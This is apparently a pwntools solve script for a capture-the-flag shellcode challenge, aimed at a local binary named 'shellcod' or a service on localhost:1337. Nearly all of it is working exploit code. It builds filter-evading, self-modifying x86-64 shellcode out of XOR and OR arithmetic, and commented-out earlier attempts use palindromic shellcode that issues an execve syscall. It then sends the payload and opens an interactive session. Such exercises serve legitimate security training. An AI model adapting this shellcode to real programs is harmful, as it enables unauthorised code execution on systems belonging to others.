from pwn import *
from icecream import ic

elf = exe = ELF("./shellcod")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001400
si
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def make_palindrome(s):
    segments = [s[i:i+2] for i in range(0, len(s), 2)]
    reversed_segments = segments[::-1]
    reversed_s = ''.join(reversed_segments)
    palindrome = s + reversed_s
    return palindrome

# level1 = asm('''jmp $ + 27''')
# level1 += b'\x05\x0f\x3b\xb0\xd2\x31\x48\xf6\x31\x48\xe7\x89\x48\x53\x00\x00\x00\x00\x6e\x69\x77\x2f\xbb\x48\x50\xc0\x31\x48'
# level1 += asm('''
#     xor rax, rax            
#     push rax            
#     mov rbx, 0x6e69772f   
#     push rbx                
#     mov rdi, rsp          
#     xor rsi, rsi            
#     xor rdx, rdx            
#     mov al, 0x3b         
#     syscall      
# ''')
# level1 += b'\x1d\xeb'
# level1 = b'\xeb\x1d\x05\x0f\x00\x00\x00\x3b\xc0\xc7\x48\xd2\x31\x48\xf6\x31\x48\xe7\x89\x48\x53\x6e\x69\x77\x2f\xc3\xc7\x48\x50\xc0\x31\x48\x48\x31\xc0\x50\x48\xc7\xc3\x2f\x77\x69\x6e\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x1d\xeb'
# level1 = asm('jmp $ + 27')
# level1 += b'\x05\x0f\x3b\xb0\xd2\x31\x48\xf6\x31\x48\xe7\x89\x48\x53\x6e\x69\x77\x2f\xc3\xc7\x48\x50\xc0\x31\x48'
# level1 += asm('''
#     xor rax, rax            
#     push rax            
#     mov rbx, 0x6e69772f   
#     push rbx                
#     mov rdi, rsp          
#     xor rsi, rsi            
#     xor rdx, rdx            
#     mov al, 0x3b         
#     syscall      
# ''')
# level1 += b'\x19\xeb'

# level1 = make_palindrome('050f0000003bb85f5400')
# level1 = bytes.fromhex(level1)
# print(disasm(level1))
# print(level1.hex())

level6 = asm('''
    and eax, 0x02020202
    or eax, 0x02020202
    xor eax, 0x02020202
    xor eax, 0x0202022f
    xor eax, 0x02020200
    or eax, 0x02025300
    or eax, 0x02026500
    xor eax, 0x02020000
        
    xor eax, 0x03020000
    xor eax, 0x036b0000
    xor eax, 0x03000000
    xor eax, 0x6d000000
    mov edi, eax
    
    mov ebx, edi
    mov edx, ebx
    and eax, 0x02020202
    or eax, 0x02020202
    xor eax, 0x02020202
    xor eax, 0x0202023b
    xor eax, 0x02020200

    push rbx
    add dword ptr [rip+7], 5
    add dword ptr [rip+2], 2
''')

level6 += b'\x43\x89\xe5'

level6 += asm('''
    add dword ptr [rip+17], 7
    xor eax, 0x02020200
    xor eax, 0x02020200
    add dword ptr [rip], 3
''')

level6 += b'\x05\x05'

print(disasm(level6))
sl(str(len(level6)))
sl(level6)


#     add dword ptr [rip+7], 5
#     add dword ptr [rip+2], 1
# ''')

# level6 += b'\x43\xc7\xc5'

# level6 += asm('''
io.interactive()